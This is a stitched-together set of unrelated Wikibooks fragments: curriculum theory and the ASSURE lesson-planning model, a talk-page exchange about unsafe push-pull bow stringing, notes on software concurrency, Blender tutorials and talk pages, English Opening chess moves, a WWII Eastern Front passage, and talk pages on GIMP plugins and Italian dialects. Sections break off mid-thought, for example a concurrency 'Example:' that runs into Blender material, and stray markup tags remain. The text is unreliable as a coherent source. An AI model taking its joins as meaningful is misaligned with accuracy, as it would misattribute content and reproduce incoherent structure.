There are many definitions for curriculum.  Bobbitt, Dewey, and Tyler believe/d curriculum needs objectives.  You need to know beforehand what you need to accomplish.  Bobbitt believed that curriculum was a way to prepare the student for industrial life.  Bobbitt, Charters, Dewey, and Tyler also believe/d in curriculum as a science.  You have to study the world around you to find the best ways to teach your students.  These educators also needed to know what are the students' needs.  What do they need to know to succeed in the world.  During the time of the Industrial Society, the classroom was the only place where students learned how to be citizens.  How to survive in this job environment.

== Information Society ==
 
Information society is characterized by the global distribution of information as distinct from industrial society which is characterized by the use of external energy sources such as petroleum to build a larger and stronger community.  Some theorist believe we are in the middle of a transition between Information and Industrial societies due to global technologies.  Computers and different media are the tools in an Informational Society.  &quot;Progress in information technologies and communication is changing the way we live: how we work and do business, how we educate our children, study and do research, train ourselves, and how we are entertained (Chair's conclusions from the G-7 Ministerial Conference on the Information Society, February 1995).

Having students working in cooperative groups helps build a strong foundation for work place problem solving skills.   Creating an environment also help students recognize patterns and envision dynamic models. These curricular approaches improve success for all types of learners and may differentially enhance the performance of at-risk students.  &quot;Just as information technology has improved effectiveness in medicine, finance, manufacturing, and numerous other sectors of society, advanced computing and telecommunications have the potential to help students master complex 21st century skills. Research-based curriculum projects are developing technologies that enable online virtual communities of practice using advanced tools to solve real world problems.&quot;(Dede)  

One of the five essential skills an employee will need in the future workplace is Information literacy.  Educating students on the power and scope of information involves communicating and explaining how information is organized.  It is also important for the student to show through a variety of sources.  This includes the tools to evaluate, organize and apply the information to problems and situations.
 

== Role of the Computers ==

There are many different and unique methods computers have for enhancing the learning in the classroom.  Some of these include:
 
*taking real situations/problems that adults face every day and applying them in the curriculum
*using &quot;advanced tools similar to those in today's high-tech workplaces&quot; (Linn 1997) within the classroom
*creating concepts, skills, and complex products (Schank, Fano, Bell, &amp; Jona 1994) through the use of long-term projects;
*using visuals to illustrate the differences of experiences
*incorporating collaborative experiences to supply different perspectives that the students can share
*&quot;developing learning experiences and generating knowledge&quot; (Scardamalia &amp; Bereiter 1994) with those with real world experience
*fostering success for all students through special measures to aid the disabled and the disenfranchised (Behrmann 1998) 

 
To implement these capabilities you will need a large-scale, pedagogy, assessment, and professional development, along with administration support.  Most programs need an organized group to continue to  research and expand the knowledge of understanding of the topics.  Without these working together, the program will not work.

== THE ASSURE MODEL ==
 

 

 

Analyze Learners 

 

The first step of the ASSURE model is to identify the learners.  The target audience can be a certain grade level, a specific or a particular group.  The audience can be analyzed in terms of:  

1.       General characteristics  

2.      Specific entry competences or  

3.      Learning styles 

 

General Characteristics: Describe general characteristics of the learners, such as age and demographic information. 

Entry Characteristics: Characterize the learner or learners. 

Learning Styles: Enter information about students’ learning styles. 

 

 

State Objectives 

 

The objectives should be stated next and should be as specific as possible.  These are statements as to what the learner will be able to do at the end of instruction.  The conditions under which the students is going to perform and the degree of acceptable performance. 

The Helpful Hundred list includes suggested action words that contribute to the creation of effective objectives. 

 

 

Select Methods, Media and Materials 

 

Next are the methods to be used along with the listings of media and materials necessary to enable learners to meet the stated objectives. 

 

Methods: Describe the methods used to implement the lesson to the audience you described, to order to achieve the objectives listed on the previous screens. 

Media: List any multimedia you intend to use. 

Materials: This is a list of learning materials used, such as art supplies, textbooks, or interactive learning guides. 

 

When selecting materials you can: 

1.       Select available materials 

2.      Modify existing materials 

3.      Design new materials 

 

Utilize Media and Materials 

 

Create and view the plan for using the selected media and materials to implement the methods of your lesson plan. 

 

Environment Preparation: Outline necessary actions to prepare the environment, including the classroom, facilities, resources, and any equipment that will be used. 

 

Audience Preparation: Describe the plan for preparing the learners to complete the lesson, including any preparation, skills, or groupings that are necessary to use the materials and media included in the lesson.   

Students may use the media and materials individually, as in self-instruction, or in small groups, as in cooperative learning.  They may use printed materials, such as workbooks, or computer-based technology, such as the internet. 

 

 

Require Learner Participation 

 

To be effective, instruction should require active mental engagement by learners.    There should be activities that allow learners to practice the knowledge or skills and to receive feedback on the appropriateness of their efforts before being formally assessed. Outline activities that allow learners to practice their knowledge and skills and receive feedback on their progress. 

 

Initial Activities 

Create a plan for the active learning process. 

Questions to Ask: Identify questions that will help learners focus and understand the objectives. 

Activities to Do: Plan activities that require learners to practice skills that build toward the objective, require participation, and allow for immediate feedback. 

Skills to Practice: List skills that learners must master in order to achieve the objectives of the lesson. 

 

Follow-Up Activities 

Plan activities that provide reinforcement and further opportunities for learners to build upon skills and goals defined by the objectives.  

 

 

Evaluate and Revise 

 

After assessing individual students, characterize the results for this lesson. Evaluate the effectiveness and impact of the lesson plan in helping learners meet the objectives. 

 

Learner Evaluation Plan: Create a plan for evaluating student learning. Design assessments that reflect the acceptable performance defined for each lesson objective. 

Evaluation of Learner Achievement: Determine the effectiveness of the lesson plan and consider how it can be revised.  

Methods and Media Evaluation: Evaluate the effectiveness of the methods, media, and materials in assisting the learners meet the objectives.

Hi,

In light of the note you added to the [[Adventist Youth Honors Answer Book/Recreation/Archery|Archery Honor]], I rearranged the section a bit to make your warning more prominent.  I'd like very much if you would review the changes I made and make any corrections you feel are necessary.  Thanks for pointing out the problem.  --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 18:48, 13 March 2009 (UTC)

That was fast. Thanks for updating the page. It looks fine. Push Pull is a time honored method of stringing, but I've met at least one person in person who almost lost an eye to it, and plenty of others in archery forums, so the method is now counter-indicated by associations like the NAA, NFAA and FITA. Push pull was probably relatively save with English longbows, which are sufficiently long such that only the flat of the bow could hit your head. Recurve bows, on the other hand, curve back so that the limb forms a hammer-like striking tip which is perfectly aligned with your temple (the thinnest part of the skull) or your eye socket, which is why the method is so dangerous--even with a light bow. I've even read one claim of a death caused by the method-but I'm unable to locate that claim and verify it. 

I'm sorry that I'm too much of a noob to properly link my claim in the article to the citation I provided in the references section. There is a 4th method of bow stringing that uses a foot loop, one that is simple and easy and one that is safe for bows and people, but I don't have a free image of it yet. I'll post some time when I do.
----
Excellent.  I'll add the citation link in a bit.  We don't do a whole lot of that in Wikibooks like they do in Wikipedia, so I'll have to figure out how to do it (again).  It's not that hard - I just don't remember how. 

I do keep a pretty close eye on this book, making several checks on it per day.  There ''are'' vandals about (though they don't seem to specifically target this book - just Wikibooks in general).  The main criticism I hear against this resource is that anyone can change it in a most unsavory way.  But I think that could well be its main strength - you are an anonymous editor who has corrected potentially dangerous advice.  Static print-only versions of these resources cannot be fixed once they're out there, and even then, new copies are not updated frequently.  Thanks so much for the info.  Also, you might consider creating an account.  --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 21:15, 13 March 2009 (UTC)

I may have one. Is it different from Wikipedia? (I suppose I could look it up). I hadn't come here with an eye to changing the book, I was just following a google image link and happened to noticed the outdated advice about push pull stringing...

As to the citations, I can see why they might not be as common in wiki books (which I hadn't heard of until today) but they seem like a good idea in that they don't hurt anything and provide an extra level of confidence in the material. I figured a mod might check on the claim I added and I figured a cite would give them some confidence in the veracity of the claim.
----
The citation is now in place.  A picture paints a thousand words, and in this case, those words are very convincing.  Most of the images that appear on Wikipedia are hosted by the Wikimedia Commons which makes them equally available on Wikibooks (the two projects are run by the same organization).  Please take a crack at adding the section.  If you mess up the formatting, I will happily fix it.  It's nice to get competent contributions! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 21:25, 13 March 2009 (UTC)

A question for you. The book title is &quot;Adventist Youth Honors Answer Book/Recreation/Archery.&quot; How morphable are wikibooks? Were the title just about archery, I'd figure it would be open season to modify the book with the goal of providing clarity about archery (specifically recurve target archery, which seems to be the area of expertise of the author) but there is also the issue of of the &quot;Adventist Youth Honors.&quot; &lt;s&gt;Is this a text book that must conform to a specific Adventest program or set of goals?&lt;/s&gt; Ah, I see that the Adventist Youth Honors is a very specific program. Well, the Push Pull method needed to be noted as dangerous, and hopefully that won't mess up students on their tests for this requirement. And given the very specific nature of this text, there isn't much I can add to it since I don't wish to mess up the congruence with the Honors program requirements, even though some of them are outdated.
----
Yeah, this is very much structured for a specific program.  The requirements for the honors are set by a committee and I have no authority to change them.  But when I see something I think ought to be changed, I tag it (see requirement 8 for an example).  Mark West, a professional archer who put most of these answers together also believes that this honor ought to be overhauled completely.  

If you'd like to start your own archery book, I encourage you to do so.  For starters, you could cut-n-paste this one and then morph it into whatever form you desire.  Lemme know if you decide to do that so I can help you preserve the edit history from here.  Or if you don't want to use this work as your starting point that's OK too.  To start a new book, just click [[Archery]] and start editing.  If you do undertake such an effort, there are concrete advantages to registering.  Believe it or not, your anonymity is ''more'' anonymous if you register (if you prefer to remain anonymous anyhow).  If there's any way I can help you, just let me know. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 22:23, 13 March 2009 (UTC)

I'd have to go with Mark West on this one. Archery has changed since the text in question was originally written. Mark West is clearly qualified to tell you what to change if anyone is. I know how tough it can be to get a change through a large organization, though. As to some of your proposed small changes, I don't think it makes sense to use metric conversions to identify the targets in the specifications. FITA targets are always referred to by their metric size (60 cm, for example) and never by Imperial measurements. Since people have to purchase these targets there is no value in providing an Imperial measurement which will not aid in the acquisition of the said targets. Imperial equivalent for the distance, though, has some utility. Also, the term Olympic bow, while descriptive, is no longer strictly accurate. Such bows are more officially referred to as FITA Recurve bows, but given all the different classes of bows it might make sense for the proposed changes to just say what they mean: A Recurve bow with a sight, stabilizer and clicker. However, beginners are typically taught to use recurves with no sights, no stabilizers, nor a clicker, so I'm not sure requiring such bows is really a realistic idea for a beginning archery merit program.


I'd also love to see someone provide equivalent content for you to replace the outdated (not completely outdated, though) and out of print 1974 NAA Instructor's manual. The chance of a student ordering an out of print copy to read the recommended chapters is rather low. There are a number of free resources on the web that might provide some equivalent material for you to refer people out to: 

Archery Australia: Basic and Advanced:
http://www.archery.org.au/scripts/cgiip.exe/WService=ASP0009/ccms.r?pageid=10282

FITA Basic and advanced:

Beginners Manual
http://www.archery.org/UserFiles/Document/FITA%20website/04%20Development/Beginners_Manual/BeginnersManuel-e.pdf

Coaching Manual
http://archery.org/content.asp?id=1036&amp;me_id=836&amp;cnt_id=2625

and the Archer's Reference, by Murray Elliot.

http://www.archersreference.co.uk/download.html

Because of these excellent materials which are available free, online (though not open source), I'm unlikely to start an archery wiki book unless I see an under-served area where it would provide value that is not already served. Unfortunately, none of these materials is open source, so the future availability is not guaranteed, though there are some archery sites like Texarch.org that tend to have mirror copies.
----
Thanks for all the advice.  Sometimes a club director can replace a requirement with something requiring equivalent effort.  I think it would be totally acceptable to use the books you have mentioned to meet such a requirement. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 23:47, 13 March 2009 (UTC)</text>

      <text xml:space="preserve">Before we take a look at advantage and disadvantage let us one think save in our mind. Mostly performance advisement come first in the (object oriented) software design phase. We don't need advisement over performance in the (object oriented) analyse - normally. The problem analyse can be some important fundamentals, and these can help us for performance advisement in the (object oriented) design.

&lt;noinclude&gt;__TOC__&lt;/noinclude&gt;
==Concurrency==
Concurrency is an to check when we are in software analyse phase. With concurrency we describe side by side running pieces of our software. Which can lead to better performance, if the concurrency allows for work to be completed while waiting for IO, or if the CPU support concurrent threads of execution. Even though concurrency can lead to improved performance on both single, and multiple core CPUs concurrency incurs some overhead, and can actually decrease performance if done incorrectly, or in excess.

But only You as specialist can identify software pieces, which may running side by side. The Unified Modelling Language [UML] can help us to display concurrency in activity diagrams. These parts of software are painted between synchronize elements. It is important to create concurrency with right dimension. If they are to small, so it comes too little using, are they to big we have an user problem.

Example:

Blender is a powerful and complex 3D modeling and rendering package.  Before you can use it effectively to ''make'' things, you need to ''know'' a few things about how it works:
* the process of 3D modeling and rendering (what Blender does)
* some rudiments of 3D analytic geometry (axes and coordinates)
* orthographic and perspective views of a 3D object
* local coordinate systems and child objects
* the fundamentals of Blender's user interface (hotkeys, windows, and menus)
* how to view a 3D scene from different vantage points (in Blender)

This unit is entirely devoted to this sort of background knowledge.  You won't create your first Blender model until the next unit.

Knowing this, you might be tempted to skip ahead.  Depending on your background, this might or might not work.  For instance, if you've used other 3D graphics packages, you might be able to skim (or skip) ahead as far as the user interface tutorial.  But if there's any doubt, please proceed through the tutorials in sequence.

'''Blender is not the kind of software you can launch into and grope about until you find your way.  It's not like exploring an unfamiliar city.  It's more like flying a jet airplane.  If you hop into the pilot's seat without knowing the fundamentals, you'll be lucky to ever get off the ground, and it'd take a miracle for you to reach your destination safely.'''

===A Word about Jargon===
Like any subject, 3D modeling has its own jargon:  terminology specific to the subject and ordinary words that have special meanings in the context of computer graphics.

In this book, important new words are {{B3D:N2P/FirstUse|highlighted}} on first appearance and defined soon after.  If you suspect you've missed (or forgotten) the meaning of a word, try looking it up in the [[../Blender Glossary|Glossary]].

===Things You'll Need===
In order to work through the tutorials, you'll need access to a computer that has Blender installed ([http://www.blender.org/download download the latest stable release]).

Depending on what is installed on your system you may also need the appropriate Python installation. Each version of Blender works only with one specific version of Python, which is generally included in the download.

|-
! Blender version !! Python version
|-
| 2.49 || 2.6
|-
| 2.5x || 3.2
|-
| 2.6 || 3.3
|}

{{B3D:N2P/Hidden begin|title=Installation instructions}}
Since Blender is open-source software, you can download the source code and build it yourself, but it's easier to download a pre-built install package.  Install packages are provided for each supported operating system:
* Microsoft Windows (32-bit and 64-bit)
* Linux (32-bit and 64-bit x86)
* Apple Mac OS X (PowerPC and Intel)
* FreeBSD (32-bit and 64 bit)
* Solaris
* Irix

For example, to install Blender on a Debian-based GNU/Linux distribution (such as Ubuntu), you can enter the following command into the terminal:

:*&lt;code&gt;sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo apt-get install blender&lt;/code&gt;

Windows users get to choose between an executable installer (&quot;setup wizard&quot;) and a ZIP archive.

{{Hidden end}}

Once that finishes, Blender should appear in the Graphics section of your desktop environment's application menu.

You may also want to download 2D image editor, such as {{B3D:N2P/FirstUse|GIMP}} ([http://www.gimp.org/downloads]) or Photoshop. For viewing video files, you may want to install {{B3D:N2P/FirstUse|VLC}} ([http://www.videolan.org/vlc/index.html]) media player.

It's also a good idea to have pencil and paper handy for sketching and taking notes. There's a lot to absorb. Taking notes as you go will pay dividends later.

=== Where to Go for Help ===

In case you get stuck, you can [[../Asking for Help|ask for help from other Blender users]] in the [[../#Appendices|appendices]].

== Additional Resources ==
Many modules have a section like this at the bottom, listing websites with information on the topics covered in the module.

* [http://www.blender.org/features-gallery/requirements/ Blender system requirements]
* the ''[[GIMP]]'' wikibook
* [http://wiki.blender.org/index.php/Doc:Manual/Introduction/Installing_Blender/Windows Windows installation]
* [http://wiki.blender.org/index.php/Doc:Manual/Introduction/Installing_Blender/Linux Linux installation]
* [http://wiki.blender.org/index.php/Doc:Manual/Introduction/Installing_Blender/Mac OSX installation]
* [http://www.python.org/about/ About the Python programming language]

== Coping with Designing Problems ==
Many problems with modeling in 3D come from poor practice early on in the creation of your project. These kinds of problems can be difficult to rectify later on without completely recreating the project. This chapter will help you deal with these problems before they occur. Navigate to the next page to start the chapter.&lt;br&gt;
'''This chapter deals with certain subjects or terms you may not have learned yet. While this chapter is useful knowledge, it may be difficult to comprehend certain subjects within the chapter. It will be more useful to simply take written notes and save them for later than try and absorb the knowledge. '''

== Fastest? ==

Is there any way to prove that there are no other checkmates faster than or as fast as this one? --[[User:Whoop whoop pull up|Whoop whoop pull up]] &lt;sup&gt;[[User talk:Whoop whoop pull up|Bitching Betty]] | [[Special:Contributions/Whoop whoop pull up|Averted crashes]]&lt;/sup&gt; 23:49, 11 April 2011 (UTC)

:f3 e6 g4 Qh4 is a differnt position, but it's the same idea and most black players would play e5 instead because it's better. Clearly there can't be a faster because none of the first moves are checks, you're compelled to block a check even if you have no other option, and white has several good options queenside and g3 kingside to do just that.

= English Opening =
===2. c4===
2. c4 is a very common move in the English Opening, competing for the d5 square. It is also very flexible, allowing white to transpose into Queen's Pawn openings with a later d4 move or various lines in the English Opening (1.c4).

This position is also often reached with the move order 1.c4 Nf6 2.Nf3.

      <text xml:space="preserve">During the fall and early winter of 1941, German armored divisions had advanced toward Moscow at a rapid pace, capturing hundreds of thousands of Soviet troops in the process. By late November, German armored divisions, within a day’s travel, threatened the city. But by the first week of December, snow began falling, and temperatures plunged to -40° C (-40° F). The German soldiers, not dressed for winter weather, were freezing and losing their will to fight. Their equipment also froze, becoming useless. The Russian winter finally accomplished what its military had failed to do: It halted the German offensive.

The German army had practically turned its invasion of Russia into a rout. But at the end of July 1942, Soviet Premier Joseph Stalin issued the order, “Not a step back!” The Germans assaulted the city of Stalingrad that month, a crucial city of the Soviet Union. In the ruins of Stalingrad, shown here, Soviet soldiers fought the Germans building-by-building in a savage battle for the city that lasted for five months.

===3. g3===

White plans to develop his bishop into the long diagonal. By doing this the bishop will exert some serious pressure into the central light squares (especially d5) and into the enemy queenside. This does not come without issues however, as a king castled behind a fianchettoed bishop becomes very vulnerable should the bishop be removed.
Black now has two acceptable options, one is to play d5 immediately as delaying this move will allow white to achieve overprotection of this important central square by 4.Bg2.
Another choice for black, perhaps the sharpest is to play 3...c6, the knight will be blocked from its best square but black regains control over the d5 square and closes the long diagonal for a bishop on g2. Once d5 has been played by black, his mighty center may cause some problems for white, although (as always) the more developed player can undermine it in hypermodern fashion through the use of his c- pawn, knights and fianchettoed bishop.

      <text xml:space="preserve">== The CMYK color model plugin ==
If there is a plugin - which I could need right know - why isn´t it postet in here as a link?

I found this on the net:
[http://cue.yellowmagic.info/softwares/separate.html CMYK color model plugin]
But I´m not shure if it works.

::Hmm... I don't know, maybe that's because this page is ''not'' a list of plugins, but howto on installing plugins. [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 13:48, 23 March 2009 (UTC)

RTFM really should be the first piece of advice!  One would think?  [[User:Newbiegimplinux|Newbiegimplinux]] ([[User talk:Newbiegimplinux|talk]]) 06:23, 29 December 2010 (UTC)


      On GNU/Linux, you might need to read the manual at the official site first under the section:

     &quot;1.3. Installing New Plugins&quot;  http://docs.gimp.org/en/gimp-scripting.html#gimp-plugins-install

=== In order to test the plugin ===
You simply test the plugin! Durrr![[Special:Contributions/88.159.66.226|88.159.66.226]] ([[User talk:88.159.66.226|discuss]]) 20:56, 17 October 2012 (UTC)</text>

__TOC__


If you haven't previously studied 3D graphics, technical drawing, or analytic geometry, you are about to learn a new way of visualizing the world, an ability that's fundamental to working with Blender or any 3D modeling tool.

3D modeling is based on {{B3D:N2P/FirstUse|geometry}}, the branch of mathematics concerned with spatial relationships, specifically {{B3D:N2P/FirstUse|analytical geometry}}, which expresses these relationships in terms of algebraic formulas.  You may have studied geometry in school, in which case, some of the terminology will seem familiar.

== Coordinates And Coordinate Systems ==

Look around the room you’re in. The odds are it will have a cuboidal shape, with four vertical walls at right angles to each other, a flat, horizontal floor, and a flat, horizontal ceiling.

Now imagine there’s a fly buzzing around the room. (If there really is a fly buzzing around, feel free to look at it instead of imagining.) The fly is moving in three-dimensional space. In mathematical terms, what that means is that, at any moment, its position within the room can be expressed in terms of a unique combination of three numbers.

Now, there are an infinite number of ways—''coordinate systems''—in which we could come up with a convention for defining and measuring these numbers—the ''coordinates''. And each convention will give different values for the numbers, even if the fly is in the same position—coordinates only make sense with reference to a specific coordinate system! To narrow down the possibilities (in a purely arbitrary fashion, of course), let us label the walls of the room with the points of the compass: in a clockwise direction, North, East, South and West. (If you know which way is really north, feel free to use that to label the walls of your room; otherwise, choose any wall you like as north.)

Consider the south-west corner of your room, the point at floor level. We will call this (arbitrary) point the ''origin'' of our coordinate system, and the three numbers at this point will be &lt;math&gt;(0, 0, 0)&lt;/math&gt;. The first of the three numbers will be the distance (in some suitable units, let’s say metres) eastwards from the west wall, the second number will be the distance northwards from the south wall, and the third number will be the height above the floor.

Each of these directions is called an ''axis'' (plural: ''axes''), and they are conventionally labelled X, Y and Z, in that order. With a little bit of thought, you should be able to convince yourself that every point within the space of your room corresponds to exactly one set of &lt;math&gt;(x, y, z)&lt;/math&gt; values. And conversely that every possible combination of &lt;math&gt;(x, y, z)&lt;/math&gt; values, with &lt;math&gt; 0 \le x \le W &lt;/math&gt;, &lt;math&gt;0 \le y \le L&lt;/math&gt; and &lt;math&gt;0 \le z \le H&lt;/math&gt; (where &lt;math&gt;W&lt;/math&gt; is the east-west dimension of your room, &lt;math&gt;L&lt;/math&gt; is its north-south dimension, and &lt;math&gt;H&lt;/math&gt; is the height between ceiling and floor) corresponds to a point in the room.

The following diagram illustrates how the coordinates are built up, using the same colour codes that Blender uses to label its axes: red for X, green for Y and blue for Z (an easy way to remember this if you're familiar with RGB is the order -- Red X, Green Y, Blue Z). In the second picture, the value for ''x'' defines a plane parallel to the west wall of the room; in the third picture, the value for ''y'' defines a plane parallel to the south wall; and in the fourth picture, the value for ''z'' defines a plane parallel to the floor. Put the planes together in the fifth picture, and they intersect at a unique point.

[[File:BlenderCoordinates.png|800px|center]]

This style of coordinate system, with the numbers corresponding to distances along perpendicular axes, is called ''Cartesian coordinates'', named after René Descartes, the 17th-century mathematician who first introduced the concept. Legend has it that he came up with the idea after watching a fly buzzing around his bedroom!

There are other ways to define coordinate systems, for example by substituting direction angles in place of one or two of the distance measurements. These can be useful in certain situations, but usually all coordinate systems in Blender are Cartesian. However, switching between these coordinate systems is simple and easy to do in Blender.

=== Negative Coordinates ===

Can coordinate values be negative? Depending on the situation, yes. Here we are only considering points within our room. But supposing, instead of placing our origin in the bottom southwest corner, we put it in the middle of the room, halfway between the floor and ceiling. (After all, it is an arbitrary point, we can place it wherever we would like to, just as long as we all agree on where it is.) Now, remember that our X-coordinate is the distance ''east'' from the origin; How do we express the fact that a point lies ''west'' of the origin? Simple: We give it a negative X-coordinate. Similarly, points north of the origin have a positive Y-coordinate, while those south of it get a negative Y-coordinate; and those points above the origin get a positive Z-coordinate, while those below it get a negative Z-coordinate.

=== Handedness Of Coordinate Systems ===

It is conventional for most Cartesian coordinate systems to be ''right-handed''. To see what this means, hold the thumb, index finger and middle finger of your right hand perpendicular to each other:
[[Image:Rechte-hand-regel.jpg|thumb|right|200px|'''Figure 1:''' The three axes form a right-handed system]]
Now you can orient your hand so that the thumb points along the X-axis in the positive direction (direction of increasing coordinate numbers), the index finger along the positive Y-axis, and the middle finger along the positive Z-axis. Another way of looking at it is, if you placed your eye at the origin, and you could see the three arrows pointing in the directions of positive X, positive Y and positive Z as in Figure 1, the order X, Y, Z would go clockwise.

== Axes Of Rotation ==

Consider a spinning ball. Every point on it is moving, except the ones right in the middle: these form a line of stillness around which the rest of the ball spins. This line is called the ''axis of rotation''.

More precisely, the axis of rotation of a rotating object over a period of time is a point or a line connecting points that do not change position while that object rotates, drawn when the observer assumes he/she does not change position relative to that object over time.

Conventionally, the ''direction'' of the axis of rotation is such that, if you place your eye looking in that direction, the rotation appears clockwise, as illustrated below, where the yellow arrow shows the rotational movement, while the purple one shows the rotation axis:

[[File:RotationAxisDirections.png]]

To remember this convention, hold your right hand in a thumbs-up gesture:
[[Image:Blender3D DirectionOfRotation.png]]
If the rotation follows the direction of the curled-up fingers, then the direction of the axis of rotation is considered to be the same as the direction which the thumb is pointing in.

This gesture is a different form of the right-hand rule and is sometimes called ''[[w:Right-hand rule#Direction associated with a rotation|the right-hand grip rule]]'', ''the corkscrew-rule'' or ''the right-hand thumb rule''. From now on in this book, it will be referred to as 'the right-hand grip rule'.

When describing the direction of a rotating object, do not say that it rotates ''left-to-right/clockwise'', or ''right-to-left/counterclockwise''. Each of these claims on their own are useless, because they're relative to the observer. Instead of saying this, find the direction of the axis of rotation and draw an arrow to represent it. Then people who know the right-hand grip rule will be able to figure out what the direction of rotation of the object is, by using the rule when interpreting your drawing.

Blender's '''user interface''' (the means by which you control the software) is not particularly easy to learn.  However, it has improved over time and is expected to continue doing so. The current version of the Blender software is 2.70. You can [http://www.blender.org/download download it] from the [http://www.blender.org/ Blender Foundation]'s website.

The tutorials in this section will familiarize you with the basics of the user interface.  By the end of this section, you should be able to:
* resize, split, and merge any Blender window;
* change the type of any Blender window;
* access user preferences;
* access panels containing buttons and other controls;
* change the viewpoint of a viewport.

For those new to Blender, this is a fundamental section of the book.

===Advice on Customization===

Blender is a complex software package with many customizable features.  You can customize the user interface to assign new functions to buttons and hotkeys.  In fact, you can change almost anything to suit yourself.  However, this complicates the giving and following of directions. It is recommended that you adhere to the default screen arrangements of Blender in order to be able to follow well in the remaining parts of these tutorials. Blender ships along with some 4 to 5 screen-content arrangements which are suitable for almost any kind of job you'll want to use it for - from creating motions and animations to doing games.

We recommend leaving Blender's user interface in its &quot;factory settings&quot; while working through the ''Noob to Pro'' tutorials.  At the very least, wait until you've mastered the basics before you customize the interface - and we know you definitely will when you master it!

      <text xml:space="preserve">this article makes the major linguistic blunder of confusing &quot;dialects of Italy&quot; with &quot;dialects of Italian&quot;, . Pedemontese is most emphatically NOT a dialect of Italian, but a '''language of Italy''' (recognised as such by UNESCO). If one must refer to it as a dialect, it needs to be made clear, at least, that it is not a dialect of Italian. In fact, I would say that a talk about dialects of Italy has no place in an article about Italian, as they are very distinct linguistic entities, especially those dialecs/langauges spoken above the Rimini-La Spezia line, as is Pedemontese. --[[User:Dakrismeno|Dakrismeno]] ([[User talk:Dakrismeno|talk]]) 13:24, 16 March 2009 (UTC)

:Even if one were to stipulate that the linguistic distinction is as absolute as you assert, its consequences for the article are not &amp;mdash; because that passage is in the section on history, where it's perfectly reasonable to mention languages other than Italian.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 17:58, 16 March 2009 (UTC)
::there is no need for stipulations. The vast majority of the relevant literature (e.g. Lepschy et al. 1996; Marcato 2002, Pellegrini 1975, Rohlfs 1937, ''among others'') separates the Italic branch from the Gallo-Romance (and thus Gallo-Italic) one (to which Pedemontese belongs). So, although it is perfectly reasonable to mention other languages, it is certainly incorrect (or at least irreconcilable with the whole of the literature on Romance linguistics) to claim that &quot;Piedemontese is a dialect of italian&quot;. --[[User:Dakrismeno|Dakrismeno]] ([[User talk:Dakrismeno|talk]]) 13:16, 17 March 2009 (UTC)</text>

      <text xml:space="preserve">== Number of vertices for a cylinder ==
In figure 1 the top left cylinder has 16 vertices at it's top and 16 vertices at it's bottom. The number of vertices is what you fill in in the dialog &quot;Add Cylinder&quot;. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 17:10, 16 March 2009 (UTC)

== 6 cylinder joint ==
Confusing: The second pipe joint: The instruction to select middle vertices in the edges is ambiguous, no specifications as to what vertices and which edges. 
: All vertices in the middle of an edge (12 vertices in total), but not the vertices in the middle of the faces. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 06:45, 11 August 2009 (UTC)

:I've updated the photos, it should be crystal clear now [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 22:58, 11 August 2010 (UTC)


Math question: Why does scaling by a factor of 1.4142 work in this case? I understand how it works for the T-Joint, but can someone explain the math for this example?

The math for this is fairly simple. When given a triangle with two 45 degree angles (called a 45-45-90 triangle), using the Pythagorean Theorem you can determine that if the two sides on the 90 degree angle are given the length of one, the hypotenuse (other side) has a length of square root of 2. Here's a picture that may help: http://commons.wikimedia.org/wiki/File:45-45-triangle.svg

== Scaling along axes (T joint) ==

I removed some notes:
* Scale with constraint Y axis (S-&gt;Shift-Y), about 1.4124 (square root of 2)
** ''(Blender Noob: In 2.47 this should be Y instead of shift+Y, I think this is the same in all recent versions and the tutorial is wrong.)''
: The tutorial is right (of course ;-)). Shift-Y scales at the X and Z axes while keeping the Y axis. This is what we need here. 
* To flatten the front: scale at the X axis by factor 0. (S-X, 0).
** ''(Blender Noob again: Using the factory default for 2.47 this should be Y.)''
Following the tutorial it works exactly as described. The vertices are extruded along the X axis. I have added a bit about the view. It may be misleading that figure 1 shows the model rotated 90° clockwise. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 14:49, 20 March 2009 (UTC)
: I've rotated figure 1 so that is meets the 3D view. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 15:03, 20 March 2009 (UTC)
:The (S-&gt;Shift-Y) is Wrong:
It means scale the vertices in two dimension : X&amp;Z.  but it doesn't really scale it in Z.
i think (S-&gt;YKEY) is true.[[User:Worm 19|Worm 19]] ([[User talk:Worm 19|talk]]) 13:04, 1 August 2010 (UTC)

I wondered about this myself, I will make the nesscary changes in the description of axis's being moved [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:34, 11 August 2010 (UTC)

== Using shear ==
Wouldn't a shear (^S 1) be simpler than this scale/rotation combination. The only drawback I can see is that it is view-dependent. [[Special:Contributions/63.224.110.152|63.224.110.152]] ([[User talk:63.224.110.152|talk]]) 23:17, 28 June 2009 (UTC)
: I agree. Though I can also ad to your comment that pressing the middle mouse button will let you cycle through the different option of where you would want to shear of, making the use of the pythagoram theory unnecesary. May this method be added as an &quot;alternative method&quot;? [[User:Mswf|Mswf]] ([[User talk:Mswf|talk]]) 17:18, 9 April 2010 (UTC)

== 6 cylinder joint - easier but not equivalent ==
[[User:Vaakmeisster|Vaakmeisster]] has suggested following method:
A faster way to make a 6 pipe junction is:
* Add a cube.
* Go to edit mode.
* Select all six faces of the cube with key '''A''' if they are not selected already.
* Extrude individual faces by 2 grid units ( Press '''E''' in your keyboard -&gt; ''Individual Faces'' then type '''2''' with your keyboard).
* Now select the outer faces of the block and delete to create the holes. You should delete 6 faces in total.
* Now select everything, click set smooth and subsurf and you'll get a 6-pipe junction. You also could crease some edges to clean up the mesh ( do this by selecting the edge and pressing '''shift E'''). 
This method is simpler, but doesn't lead to the same result, the insertion will be thicker than the pipes.

==Another Way==
This seemed quite complicated, so all i did was to delete the right faces from the default cube, extrude the edges, subsurf and then crease the joints. The result was almost the same.

==Flattening the tee==
